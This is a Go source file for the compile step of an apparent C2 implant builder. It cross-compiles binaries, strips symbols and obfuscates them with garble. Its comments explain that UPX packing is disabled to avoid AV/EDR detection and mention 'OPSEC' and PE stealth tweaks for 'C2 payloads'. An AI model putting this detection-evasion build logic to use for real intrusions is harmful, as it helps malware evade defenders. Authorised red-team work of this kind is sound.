// compiler/compile.go
package compiler

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
)

// CompileOptions — builder se aayega
type CompileOptions struct {
        SourceDir        string
        OutputPath       string
        GOOS             string
        GOARCH           string
        StripSymbols     bool
        ObfuscateSymbols bool
        Debug            bool
        UseRust          bool // If true, enable CGO + link Rust lib
}

// CompileResult — build ke baad result
type CompileResult struct {
        OutputPath string
        Size       int64
}

// Build — actual compilation yahan hoti hai
func Build(opts *CompileOptions) (*CompileResult, error) {

        // Step 1: Output directory ensure karo
        if err := os.MkdirAll(filepath.Dir(opts.OutputPath), 0755); err != nil {
                return nil, fmt.Errorf("failed to create output dir: %w", err)
        }

        absOutputPath, err := filepath.Abs(opts.OutputPath)
        if err != nil {
                return nil, fmt.Errorf("failed to get absolute output path: %w", err)
        }

        // Step 2: ldflags — always strip debug info + DWARF
        // -s: strip symbol table
        // -w: strip DWARF debug info
        // Both together = max size reduction without UPX
        ldflags := "-s -w"

        // Step 3: Build command — garble preferred, go fallback
        var cmd *exec.Cmd

        if opts.ObfuscateSymbols && !opts.Debug {
                garblePath := findGarble()
                if garblePath != "" {
                        fmt.Printf("[*] Garble found: %s\n", garblePath)
                        cmd = exec.Command(garblePath,
                                "-literals",
                                "-tiny",
                                "-seed=random",
                                "build",
                                "-ldflags", ldflags,
                                "-trimpath",
                                "-o", absOutputPath,
                        )
                } else {
                        fmt.Println("[!] Garble not found — falling back to standard go build")
                        fmt.Println("[!] Install: go install mvdan.cc/garble@latest")
                }
        }

        if cmd == nil {
                goBin := findGoBinary()
                args := []string{"build", "-ldflags", ldflags, "-trimpath", "-o", absOutputPath}
                cmd = exec.Command(goBin, args...)
        }

        // Step 4: Environment
        env := os.Environ()
        env = append(env, fmt.Sprintf("GOOS=%s", opts.GOOS))
        env = append(env, fmt.Sprintf("GOARCH=%s", opts.GOARCH))

        // ── Rust/CGO Detection ──
        // Only enable CGO if:
        //   1. Rust lib was successfully copied (opts.UseRust == true)
        //   2. MinGW cross-compiler is available
        // Otherwise: CGO_ENABLED=0 (Go fallback)
        cgoStatus := "0"
        if opts.UseRust && opts.GOOS == "windows" {
                mingwPath := findExecutable("x86_64-w64-mingw32-gcc")
                if mingwPath != "" {
                        fmt.Printf("[*] MinGW found: %s — enabling CGO (Rust core)\n", mingwPath)
                        env = append(env, "CGO_ENABLED=1")
                        env = append(env, "CC=x86_64-w64-mingw32-gcc")
                        env = append(env, "CXX=x86_64-w64-mingw32-g++")
                        cgoStatus = "1"
                } else {
                        fmt.Println("[!] MinGW not found — falling back to CGO_ENABLED=0")
                        fmt.Println("[!] Install: sudo apt install gcc-mingw-w64-x86-64")
                        env = append(env, "CGO_ENABLED=0")
                }
        } else {
                fmt.Println("[*] Using CGO_ENABLED=0 (Go fallback)")
                env = append(env, "CGO_ENABLED=0")
        }

        env = append(env, "GO111MODULE=on")
        env = append(env, "GOFLAGS=")

        // sudo PATH mein Go bin dirs nahi hote — explicitly add karo
        goBinDir := "/usr/local/go/bin"
        goUserBin := os.Getenv("HOME") + "/go/bin"
        sudoUser := os.Getenv("SUDO_USER")
        if sudoUser != "" {
                goUserBin = "/home/" + sudoUser + "/go/bin"
        }
        // Existing PATH ke saath merge karo
        existingPath := os.Getenv("PATH")
        env = append(env, fmt.Sprintf("PATH=%s:%s:%s", goBinDir, goUserBin, existingPath))

        cmd.Env = env
        cmd.Dir = opts.SourceDir
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr

        fmt.Printf("[*] Compiling: GOOS=%s GOARCH=%s CGO_ENABLED=%s\n", opts.GOOS, opts.GOARCH, cgoStatus)
        fmt.Printf("[*] Source dir: %s\n", opts.SourceDir)

        if err := cmd.Run(); err != nil {
                return nil, fmt.Errorf("compilation failed: %w", err)
        }

        // Step 5: UPX compression — DISABLED (B-M1)
        // UPX packing produces a well-known runtime unpacking stub that AV/EDR
        // vendors flag as a high-confidence malware indicator. The size savings
        // (~30-40%) are not worth the detection signature hit. The server-side
        // builder (server/go_server/build_handler.go) achieves OPSEC benefits
        // via applyPEStealth (section/manifest tweaks) instead — no UPX.
        // To re-enable for dev/CI builds only, set HERO_ENABLE_UPX=1 in env.
        if !opts.Debug && os.Getenv("HERO_ENABLE_UPX") == "1" {
                applyUPX(absOutputPath, opts.GOOS)
        }

        // Step 6: Verify output
        info, err := os.Stat(absOutputPath)
        if err != nil {
                return nil, fmt.Errorf("compiled binary not found at %s: %w", absOutputPath, err)
        }

        return &CompileResult{
                OutputPath: absOutputPath,
                Size:       info.Size(),
        }, nil
}

// applyUPX — real UPX packer se compress karo
// UpYun wala 'upx' nahi — real UPX binary check karta hai
func applyUPX(binaryPath string, goos string) {
        // Windows binaries pe UPX kaam karta hai (GOOS=windows bhi)
        // Linux/darwin pe bhi kaam karta hai

        upxPath, err := exec.LookPath("upx")
        if err != nil {
                fmt.Println("[!] UPX not found — skipping compression")
                fmt.Println("[!] Install: apt install upx-ucl  OR  download from upx.github.io")
                return
        }

        // Real UPX verify karo — UpYun wala 'upx' alag hai
        // Real UPX --version output mein "Ultimate Packer" hota hai
        verifyCmd := exec.Command(upxPath, "--version")
        verifyOut, verifyErr := verifyCmd.Output()
        if verifyErr != nil || len(verifyOut) == 0 {
                fmt.Println("[!] UPX verify failed — skipping")
                return
        }
        // UpYun check — agar "NAME:" hai toh ye UpYun wala hai
        if len(verifyOut) > 5 && string(verifyOut[:5]) == "NAME:" {
                fmt.Println("[!] Found UpYun 'upx' — not the real UPX packer, skipping")
                fmt.Println("[!] Install real UPX: apt install upx-ucl")
                return
        }

        preStat, _ := os.Stat(binaryPath)
        preSizeMB := float64(0)
        if preStat != nil {
                preSizeMB = float64(preStat.Size()) / 1024 / 1024
        }

        fmt.Printf("[*] Applying UPX compression (pre: %.2f MB)...\n", preSizeMB)

        // -7: level 7 compression — good ratio, much faster than --best
        // --best = level 9 = 3-4 min, -7 = ~30-45 sec, ratio difference minimal
        // --lzma would give better ratio but is even slower than --best
        // -7 is the sweet spot for C2 payloads
        upxCmd := exec.Command(upxPath, "-7", "--no-backup", binaryPath)
        upxCmd.Stdout = os.Stdout
        upxCmd.Stderr = os.Stderr

        if err := upxCmd.Run(); err != nil {
                fmt.Printf("[!] UPX compression failed: %v\n", err)
                return
        }

        postStat, _ := os.Stat(binaryPath)
        if postStat != nil {
                postSizeMB := float64(postStat.Size()) / 1024 / 1024
                ratio := (1.0 - postSizeMB/preSizeMB) * 100
                fmt.Printf("[+] UPX done: %.2f MB → %.2f MB (%.0f%% reduction)\n",
                        preSizeMB, postSizeMB, ratio)
        }
}

// findGarble — garble binary dhundho
// sudo PATH se $GOPATH/bin strip ho jata hai
// isliye common locations manually check karte hain
func findGarble() string {
        // 1. Normal PATH mein check karo
        if p, err := exec.LookPath("garble"); err == nil {
                return p
        }

        // 2. sudo se PATH strip hoti hai — common Go bin locations check karo
        candidates := []string{
                // Standard GOPATH locations
                os.Getenv("HOME") + "/go/bin/garble",
                "/root/go/bin/garble",
                "/home/" + os.Getenv("SUDO_USER") + "/go/bin/garble",

                // System-wide Go installs
                "/usr/local/go/bin/garble",
                "/usr/local/bin/garble",
                "/usr/bin/garble",

                // snap / flatpak
                "/snap/bin/garble",
        }

        for _, p := range candidates {
                if p == "" || p == "/go/bin/garble" {
                        continue
                }
                if _, err := os.Stat(p); err == nil {
                        return p
                }
        }

        return ""
}

// findGoBinary — go binary dhundho (sudo PATH stripped hoti hai)
func findGoBinary() string {
        if p, err := exec.LookPath("go"); err == nil {
                return p
        }
        candidates := []string{
                "/usr/local/go/bin/go",
                "/usr/lib/go/bin/go",
                "/usr/bin/go",
                "/snap/bin/go",
        }
        for _, p := range candidates {
                if _, err := os.Stat(p); err == nil {
                        return p
                }
        }
        return "go" // last resort
}

// findExecutable — check if an executable exists in PATH
// Returns full path if found, empty string if not
func findExecutable(name string) string {
        // Try exec.LookPath first
        if p, err := exec.LookPath(name); err == nil {
                return p
        }
        // Try common locations
        candidates := []string{
                "/usr/bin/" + name,
                "/usr/local/bin/" + name,
                "/usr/sbin/" + name,
        }
        for _, p := range candidates {
                if _, err := os.Stat(p); err == nil {
                        return p
                }
        }
        return ""
}
